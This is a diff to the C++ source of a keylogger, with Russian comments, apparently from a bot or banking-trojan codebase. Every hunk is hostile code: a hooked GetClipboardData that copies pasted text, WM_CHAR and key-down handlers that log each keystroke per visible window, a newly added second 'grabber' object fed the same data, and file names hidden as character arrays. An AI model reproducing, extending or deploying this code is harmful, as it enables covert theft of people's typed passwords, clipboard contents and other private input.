@@ -40,8 +40,8 @@ char FieldLog[]   = {'l', 'o', 'g',  0};
 
 //---------------------------------------------------------------------------
 
-// Стартовое значение печатаемыъ символов
-#define CHAR_CODES_START 32
+// Стартовое значение печатаемых символов
+#define CHAR_CODES_START VK_SPACE
 
 
 
@@ -325,6 +325,9 @@ namespace KeyLoggerHooks
 		return Result;
 	}
 
+	//-----------------------------------------------
+	//  Функция обрабатывает вставку из буфера обмена
+	//-----------------------------------------------
 	HANDLE WINAPI Hook_GetClipboardData(UINT uFormat)
 	{
 		HANDLE DataHandle = Real_GetClipboardData(uFormat);
@@ -334,7 +337,7 @@ namespace KeyLoggerHooks
 		{
 			// Проверяем  окно владеющее фокусом
 			PKeyLogger Logger = GetLogger(true);
-			if (Logger == NULL || KLG.System == NULL)
+			if (!Logger || (!KLG.System && !Logger->NewKeylogger->Active()) )
 				return DataHandle;
 
 			KLGDBG("UnKLG", "Перехватываем данные из буфера обмена. WND = %d ", Logger->ActiveWND);
@@ -345,10 +348,20 @@ namespace KeyLoggerHooks
 			KLGDBG("UnKLG", "Извлечение данных из буфера '%s'", Data);
 
 			// Добавляем их в хранилище
-			if (Data != NULL)
+			if (Data)
 			{
-				KeyLogger::AddStrToBuffer(NULL, Data, 0);
-				KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
+				// Отсылаем запрос в новый граббер
+				if (Logger->NewKeylogger->Active())
+				{
+                	Logger->NewKeylogger->LogClipboard(Data);
+                }
+
+				// Дублируем в старый
+				if (KLG.System)
+				{
+					KeyLogger::AddStrToBuffer(NULL, Data, 0);
+					KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, Data);
+                }
 			}
 
 			if( uFormat == CF_UNICODETEXT )
@@ -637,161 +650,139 @@ void KeyLogger::DeleteAllTextData(HWND Wnd)
 
 //---------------------------------------------------------------------------
 
+struct TNonPrintChar
+{
+	WCHAR Code;
+	PCHAR Text;
+};
+
+TNonPrintChar NonPrintChars[] = {
+									{VK_RETURN, "\r\n"   },
+									{VK_BACK,   "{Back}" },
+									{VK_DELETE, "{Del}"  },
+									{VK_LEFT,   "{Left}" },
+									{VK_RIGHT,  "{Right}"},
+									{VK_UP,     "{Up}"   },
+									{VK_DOWN,   "{Down}" },
+									{VK_TAB,    "{Tab}"  },
+									{0, NULL}
+								};
+
+
+//-----------------------------------------------
+//  Функция возвращает текст непечатного символа
+//-----------------------------------------------
 bool GetNonPrintCharText(DWORD Char, PCHAR &Buf)
 {
 	// Функция возвращает текст для непечатного символа
-	PCHAR S = NULL;
 	Buf = NULL;
 
-	#define Set(V) S = V; break
-
-	switch (Char) {
-		case VK_RETURN: Buf = STR::New("\r\n"); return true;
-		case VK_BACK:   Set("Back");
-		case VK_DELETE: Set("Del");
-		case VK_LEFT:   Set("Left");
-		case VK_RIGHT:  Set("Right");
-		case VK_UP:     Set("Up");
-		case VK_DOWN:   Set("Down");
-		case VK_TAB:    Set("Tab");
-
-	default:
-	{
-		return false;
-    }
-	}
-
-	Buf = STR::New(3, "{", S, "}");
-	return true;
+	for (int i = 0; NonPrintChars[i].Code != 0; i++)
+		if (NonPrintChars[i].Code == Char)
+		{
+			Buf = NonPrintChars[i].Text;
+			return true;
+		}
+	return false;
 }
 
-void ProcessCharMessage2(PMSG Msg, bool IsUnicode)
+
+void ProcessCharMessage2(HWND Wnd, PCHAR KeyText, bool IncCounter)
 {
 	// Отображаем отображение символа WM_CHAR
 	PKeyLogger Logger = GetLogger(true);
-	if (Logger == NULL)
-		return;
+	if (Logger == NULL) return;
 
 	// Игнорируем невидимые окна
-	if (!pIsWindowVisible(Msg->hwnd))
-    	return;
+	if (!pIsWindowVisible(Wnd)) return;
+
+	// тправляем ввод в новый кейлогер
+	Logger->NewKeylogger->LogKeyboard(Wnd, KeyText);
+	// Дублируем в старые методы
+	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, KeyText);
+
 
 	// Устанавливаем активное окно
-	if (Logger->ActiveWND != Msg->hwnd)
+	if (Logger->ActiveWND != Wnd)
 	{
-		if (!KeyLogger::SetActiveWnd(Msg->hwnd, LOG_KEYBOARD))
+		if (!KeyLogger::SetActiveWnd(Wnd, LOG_KEYBOARD))
         	return;
 	}
 
-	if (KLG.StopLogging)
-    	return;
-  
-	PCHAR Buf = NULL;
-	DWORD BufLen = 0;
-	bool FreeBuf = false;
+	if (KLG.StopLogging) return;
 
-    bool IncCounter = false;
-
-	DWORD Code = Msg->wParam;
-
-	if (GetNonPrintCharText(Code, Buf))
-	{
-		// Отображаем непечатаемый символ
-		FreeBuf = true;
-	}
-	else
-		if (Code >= CHAR_CODES_START)
-		{
-			// Добавляем печатные символы
-			if (!IsUnicode)
-			{
-				// В ANSI версии передаём один символ
-				Buf = (PCHAR)&Code;
-				BufLen = 1;
-			}
-			else
-			{
-				// Добавляем Unicode  символ
-				WCHAR WChar = (WCHAR)Code;
-				FreeBuf = true;
-				Buf = WSTR::ToAnsi(&WChar,  1);
-			}
-
-			IncCounter = true;
-		}
+	KLGDBG("UnKLG", "Ввод - %s", KeyText);
 
 
-	#ifdef DebugUtils
-		PCHAR TmpStr = STR::New(Buf, BufLen);
-		KLGDBG("UnKLG", "Ввод - %s", TmpStr);
-		STR::Free(TmpStr);
-	#endif
-
-	if (Buf != NULL)
-	{
-		KeyLogger::AddStrToBuffer(NULL, Buf, BufLen);
-		if (FreeBuf)
-			STR::Free(Buf);
-	}
+	KeyLogger::AddStrToBuffer(NULL, KeyText, 0);
 
 	if (IncCounter)
-    	KeyLogger::IncActionCounter();
+		KeyLogger::IncActionCounter();
+
 }
 //---------------------------------------------------------------------------
 
 void ProcessCharMessage(PMSG Msg, bool IsUnicode)
 {
+	PKeyLogger Logger = GetLogger(false);
+	if (!Logger) return;
+
+    bool IncCounter = false;
+	PCHAR Buf = NULL;
 	char keyChar[2];
-	if( IsUnicode )
+
+	if (!GetNonPrintCharText(Msg->wParam, Buf))
 	{
-		wchar_t keyWChar[2];
-		keyWChar[0] = Msg->wParam;
-		keyWChar[1] = 0;
-		pWideCharToMultiByte( 1251, 0, keyWChar, 1, keyChar, 1, 0, 0 );
+		// Проверяем необходимость логирования символа
+		if (Msg->wParam < CHAR_CODES_START)
+			return;
+
+
+		// Обрабатывается печатный символ
+		IncCounter = true;
+		if( IsUnicode )
+		{
+			wchar_t keyWChar[2];
+			keyWChar[0] = Msg->wParam;
+			keyWChar[1] = 0;
+			pWideCharToMultiByte( 1251, 0, keyWChar, 1, keyChar, 1, 0, 0 );
+		}
+		else
+			keyChar[0] = Msg->wParam;
+    }
+
+	if (!Buf)
+	{
+		keyChar[1] = 0;
+		Buf = keyChar;
 	}
-	else
-		keyChar[0] = Msg->wParam;
-	keyChar[1] = 0;
-	KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, keyChar);
-	ProcessCharMessage2( Msg, IsUnicode );
+
+	ProcessCharMessage2(Msg->hwnd, Buf, IncCounter);
 }
 
 void ProcessKeyDownMessage(PMSG Msg)
 {
 	// Обработка сообщения нажатой кнопки клавиатуры
 
-	// Устанавливаем активное окно
-	KeyLogger::SetActiveWnd(Msg->hwnd, LOG_KEYBOARD);
-
 	// Проверяем необходимость обработки нажатия кнопки символа
 	// Выведено в отдельную функцию потому для обработки некоторых
 	// служебных символов
 
 	const static DWORD SupportChars[] =
-		{VK_TAB, VK_BACK, VK_DELETE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, 0};
-	const static char CHAR_KB[] = 
-		{CHAR_TAB, CHAR_BACK, CHAR_DELETE, CHAR_LEFT, CHAR_RIGHT, CHAR_UP, CHAR_DOWN, 0};
+		{VK_TAB, VK_DELETE, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, 0};
 
-
-	bool Supported = false;
+	PCHAR Buf = NULL;
 	for (int i = 0; SupportChars[i] != 0; i++)
-	{
 		if (SupportChars[i] == Msg->wParam)
 		{
-			Supported = true;
-			
 			//вызываем событие для служебных символов
-			char keyChar[2];
-			keyChar[0] = CHAR_KB[i];
-			keyChar[1] = 0;
-			KeyLogger::CallEvent(KLE_ADD_TEXT_LOG, keyChar);
-
+			GetNonPrintCharText(Msg->wParam, Buf);
 			break;
         }
-	}
 
-	if (Supported)
-		ProcessCharMessage2(Msg, false);
+
+	if (Buf)
+		ProcessCharMessage2(Msg->hwnd, Buf, false);
 }
 //---------------------------------------------------------------------------
 
@@ -1316,6 +1307,13 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 	Logger->Buffer     = (PCHAR)MemAlloc(Logger->BufferSize);
 	Logger->Position   = 0;
 
+
+	//---------------------------------------
+	//  Создаём новый кейлогер
+	Logger->NewKeylogger = new TKeyLogger();
+
+
+	//---------------------------------------
 	GlobalKeyLogger = Logger;
 
 	return Logger;
@@ -1455,7 +1453,7 @@ void KeyLogger::AddStrToBuffer(HWND Wnd, PCHAR Str, DWORD StrLen)
 		return;
 
 	if (StrLen == 0)
-		StrLen = StrCalcLength(Str);
+		StrLen = STRA::Length(Str);
 
 	if (Wnd == NULL)
     	Wnd = Logger->ActiveWND;
@@ -2933,7 +2931,7 @@ PCHAR KeyLoggerGetProcessListFileName()
 {
 	// ФИмя файла списка процессов
 	char FileName[] = {'k', 'l', 'p', 'c', 'l', 's', 't', '.', 'd', 'a', 't',  0};
-	return BOT::GetWorkPathInSysDrive(NULL, FileName);
+	return BOT::GetWorkPath(NULL, FileName);
 }
 
 //----------------------------------------------------------------------------
